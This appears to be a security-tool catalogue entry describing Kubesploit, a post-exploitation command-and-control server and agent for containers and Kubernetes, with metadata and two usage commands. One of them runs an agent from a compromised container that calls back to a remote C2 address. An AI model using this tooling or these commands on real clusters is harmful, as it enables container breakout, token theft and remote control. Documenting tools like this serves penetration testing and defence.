---
name: "kubesploit"
categories:
  - blackarch-scanner
version: "86.2de2f12"
homepage: "https://github.com/cyberark/kubesploit"
packaged-by: [blackarch]
blackarch-builddate: "2022-12-02"
build-system: go
license: GPL3
meta-checked: "2026-11-09"
github-repo: "cyberark/kubesploit"
github-stars: 1227
github-pushed: "2025-02-03"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# kubesploit

> HTTP/2 C2 server and agent for post-exploiting containerized environments, built on Merlin.

## What it's for

Kubesploit (CyberArk Labs) is a cross-platform post-exploitation Command & Control
server and agent dedicated to containerized environments, written in Go on top of the
Merlin C2 and extended with the Yaegi Go interpreter so attack modules written in Go
are loaded into the agent at runtime. Where scanners like kube-hunter or kubeletctl
only surface a weakness, Kubesploit exploits it: bundled modules cover container
breakouts via mount, docker.sock, cGroups, kernel modules and the CVE-2019-5736
runc flaw, Kubernetes CVE scanning, port scanning focused on cluster services, a
lightweight kubelet client (RCE scan, pod listing, token collection, command
execution) and Docker enumeration via Deepce. The operator runs the server and works
a Merlin-style console; the agent is delivered to a foothold inside a container and
calls back over HTTP/2. Upstream also ships YARA rules and a per-module mitigation
document (MITIGATION.md) for blue teams. Development is dormant (no pushes since
2025), so validate module coverage against current cluster versions before relying
on it.

## Typical use cases

### Start the C2 server

```
./kubesploitServer
```

Outcome: Launches the Kubesploit server using `config.yaml` in the working directory (listen interface, port — 443 by default) and opens the interactive console used to manage sessions and run container-focused modules against connected agents.

### Connect an agent from a compromised container

```
./agent -url https://198.51.100.10:443 &
```

Outcome: The agent, dropped on a foothold inside a target container, connects back to the server over HTTP/2 and appears as a new session in the console, after which the server's modules (breakout, CVE scan, kubelet operations, Docker enumeration) can be tasked against it.

*No corpus evidence — derived from upstream documentation.*
